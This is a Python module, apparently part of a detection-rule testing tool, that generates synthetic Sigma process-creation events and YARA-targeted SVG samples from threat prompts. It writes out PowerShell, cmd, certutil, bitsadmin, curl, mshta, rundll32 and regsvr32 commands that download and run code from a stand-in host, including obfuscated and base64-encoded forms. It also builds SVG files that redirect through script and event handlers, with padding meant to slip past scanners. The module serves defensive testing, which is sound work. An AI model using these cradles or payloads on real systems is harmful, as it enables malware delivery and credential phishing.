"""Prompt Engine: Generative threat scenario engine and permutation generator."""

from __future__ import annotations

import base64
import random
import re
import uuid
from typing import Dict, List, Tuple

from .models import Variant


class PromptEngine:
    """Parses natural-language threat directives and generates synthetic test variants."""

    LOLBINS_MAP = {
        "powershell": ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe"),
        "pwsh": ("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe"),
        "cmd": ("C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
        "mshta": ("C:\\Windows\\System32\\mshta.exe", "mshta.exe"),
        "curl": ("C:\\Windows\\System32\\curl.exe", "curl.exe"),
        "rundll32": ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe"),
        "wscript": ("C:\\Windows\\System32\\wscript.exe", "wscript.exe"),
        "cscript": ("C:\\Windows\\System32\\cscript.exe", "cscript.exe"),
        "certutil": ("C:\\Windows\\System32\\certutil.exe", "certutil.exe"),
        "bitsadmin": ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe"),
        "regsvr32": ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe"),
        "msiexec": ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe"),
    }

    def generate_from_prompt(self, prompt: str, target_type: str = "sigma") -> Variant:
        """Translates an arbitrary operator prompt directive into a safe synthetic variant."""
        prompt_lower = prompt.lower()
        var_id = f"prompt-{uuid.uuid4().hex[:8]}"

        if target_type == "yara":
            return self._build_yara_variant(var_id, prompt, prompt_lower)
        return self._build_sigma_variant(var_id, prompt, prompt_lower)

    def _build_sigma_variant(self, var_id: str, raw_prompt: str, p: str) -> Variant:
        # 1. Identify LOLBin
        selected_bin = "powershell"
        for bin_name in self.LOLBINS_MAP:
            if bin_name in p:
                selected_bin = bin_name
                break

        full_path, bin_exec = self.LOLBINS_MAP[selected_bin]

        # 2. WindowStyle switches
        window_flag = "-w hidden"
        if "-w 1" in p or "numeric" in p or "integer" in p:
            window_flag = "-w 1"
        elif "-w h" in p or "short" in p or "abbreviat" in p:
            window_flag = "-w h"
        elif "normal" in p:
            window_flag = ""

        # 3. Destination URI (Strictly RFC 2606)
        dest_domain = "https://cdn.delivery.stage.invalid/update"

        # 4. Construct Command Line based on LOLBin
        axis = "syntax"
        if selected_bin in ("powershell", "pwsh"):
            if "split" in p or "concatenat" in p:
                cmd = f'{bin_exec} {window_flag} -c "&(\'Inv\'+\'oke-RestMethod\') {dest_domain}.ps1 | iex"'
                axis = "obfuscation"
            elif "enc" in p or "base64" in p:
                encoded = base64.b64encode(b"irm https://cdn.delivery.stage.invalid/p | iex").decode("ascii")
                cmd = f"{bin_exec} {window_flag} -enc {encoded}"
                axis = "obfuscation"
            elif "downloadfile" in p or "webclient" in p:
                cmd = f'{bin_exec} {window_flag} -c "(New-Object Net.WebClient).DownloadFile(\'{dest_domain}.exe\',\'%TEMP%\\x.exe\')"'
                axis = "syntax"
            else:
                cmd = f'{bin_exec} {window_flag} -c "irm {dest_domain}.ps1 | iex"'
        elif selected_bin == "cmd":
            if "start /b" in p or "background" in p:
                cmd = f"cmd.exe /c start /b powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            elif "start /min" in p or "minimiz" in p:
                cmd = f"cmd.exe /c start /min powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            else:
                cmd = f"cmd.exe /c powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            axis = "syntax"
        elif selected_bin == "rundll32":
            cmd = f"rundll32.exe url.dll,FileProtocolHandler {dest_domain}.hta"
            axis = "lolbin"
        elif selected_bin in ("wscript", "cscript"):
            cmd = f"{bin_exec} //e:vbscript {dest_domain}.vbs"
            axis = "lolbin"
        elif selected_bin == "mshta":
            cmd = f"mshta.exe {dest_domain}.hta"
            axis = "lolbin"
        elif selected_bin == "curl":
            cmd = f"curl.exe -s -k {dest_domain}.bin -o %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "certutil":
            cmd = f"certutil.exe -urlcache -split -f {dest_domain}.bin %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "bitsadmin":
            cmd = f"bitsadmin.exe /transfer myJob /download /priority normal {dest_domain}.bin %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "regsvr32":
            cmd = f"regsvr32.exe /s /n /u /i:{dest_domain}.sct scrobj.dll"
            axis = "lolbin"
        else:
            cmd = f"{bin_exec} {dest_domain}"
            axis = "lolbin"

        return Variant(
            id=var_id,
            target_type="sigma",
            axis=axis,
            mutation_name=f"prompt_{selected_bin}_{axis}",
            description=f"Prompt directive: {raw_prompt[:80]}",
            payload={
                "EventID": 1,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": full_path,
                "CommandLine": cmd,
                "User": "VICTIM-PC\\analyst",
            },
            cycle=1,
        )

    def _build_yara_variant(self, var_id: str, raw_prompt: str, p: str) -> Variant:
        # Check padding
        padding_bytes = 0
        pad_match = re.search(r"(\d+)\s*(k|kb|bytes?)?", p)
        if pad_match:
            num = int(pad_match.group(1))
            unit = pad_match.group(2) or ""
            if "k" in unit:
                padding_bytes = num * 1024
            elif num > 100:
                padding_bytes = num

        prefix = ""
        if padding_bytes > 0:
            prefix = "<!-- " + ("P" * min(padding_bytes, 8192)) + " -->\n"

        # Check tag namespace
        svg_tag = "<svg"
        if "namespace" in p or "prefix" in p or "svg:svg" in p:
            svg_tag = "<svg:svg"

        close_tag = "</svg:svg>" if svg_tag == "<svg:svg" else "</svg>"

        # Check script style
        axis = "structural"
        if "cdata" in p:
            body = '  <script><![CDATA[ window.location.href = "https://auth.stage.invalid/login"; ]]></script>'
        elif "bracket" in p or "concatenat" in p:
            body = '  <script>window["loc"+"ation"]["hr"+"ef"] = "https://auth.stage.invalid/login";</script>'
            axis = "obfuscation"
        elif "onerror" in p:
            body = '  <image href="x" onerror="location.replace(\'https://auth.stage.invalid/login\')"/>'
            axis = "syntax"
        elif "onload" in p:
            body = '  <circle cx="20" cy="20" r="10" onload="location.assign(\'https://auth.stage.invalid/login\')"/>'
            axis = "syntax"
        elif "javascript:" in p:
            body = '  <a href="javascript:location.replace(\'https://auth.stage.invalid/login\')"><text>Click</text></a>'
            axis = "syntax"
        else:
            body = '  <script>window.location.href = "https://auth.stage.invalid/login";</script>'

        if svg_tag == "<svg:svg":
            payload = f'{prefix}<svg:svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">\n{body}\n</svg:svg>'
        else:
            payload = f'{prefix}<svg xmlns="http://www.w3.org/2000/svg">\n{body}\n</svg>'

        return Variant(
            id=var_id,
            target_type="yara",
            axis=axis,
            mutation_name=f"prompt_svg_{axis}",
            description=f"Prompt directive: {raw_prompt[:80]}",
            payload=payload,
            cycle=1,
        )

    def generate_novel_hypothesis(self, target_type: str = "sigma", index: int = 1) -> Tuple[str, Variant]:
        """Generates a novel threat hypothesis prompt and its corresponding variant."""
        if target_type == "yara":
            templates = [
                ("SVG with 2KB comment header pushing root element", "Probe YARA scan window with 2048 bytes of comment padding"),
                ("SVG using <svg:svg> XML namespace alias", "Test SVG parsing with namespace prefix <svg:svg> and location.replace"),
                ("SVG dynamic property concatenation", "Test JavaScript bracket access window['location']['href'] to evade literal strings"),
                ("SVG CDATA enclosed script block", "Evaluate script execution wrapped in CDATA encapsulation with external https URI"),
                ("SVG onerror image redirect handler", "Test image element triggering onerror event handler to redirect browser"),
                ("SVG with 4.5KB comment padding (boundary push)", "Probe boundary beyond 4096 bytes using 4500 bytes of XML comment padding"),
            ]
            desc, prompt = templates[index % len(templates)]
            return prompt, self.generate_from_prompt(prompt, target_type="yara")

        templates = [
            ("PowerShell with integer -w 1 switch alias", "Test ClickFix PowerShell execution with integer window switch -w 1"),
            ("PowerShell with abbreviated -w h switch alias", "Simulate PowerShell execution with abbreviated -w h switch"),
            ("PowerShell with split Invoke-RestMethod cmdlet", "Probe cmdlet splitting &('Inv'+'oke-RestMethod') with download"),
            ("Rundll32 URL Protocol Handler invocation", "Simulate Explorer spawning rundll32 url.dll,FileProtocolHandler to remote HTA"),
            ("Windows Script Host remote script execution", "Test Explorer spawning wscript.exe with remote https VBScript destination"),
            ("Curl silent background download cradle", "Test Explorer spawning curl.exe downloading binary payload to temp directory"),
            ("CMD start /b background PowerShell staging", "Simulate CMD launching background PowerShell cradle using start /b"),
            ("Certutil living-off-the-land remote download", "Test Explorer spawning certutil.exe -urlcache -split to fetch remote payload"),
            ("Bitsadmin background transfer job execution", "Simulate Explorer spawning bitsadmin.exe to download remote executable"),
            ("MSHTA remote HTA application launcher", "Test Explorer spawning mshta.exe targeting remote https payload"),
        ]
        desc, prompt = templates[index % len(templates)]
        return prompt, self.generate_from_prompt(prompt, target_type="sigma")
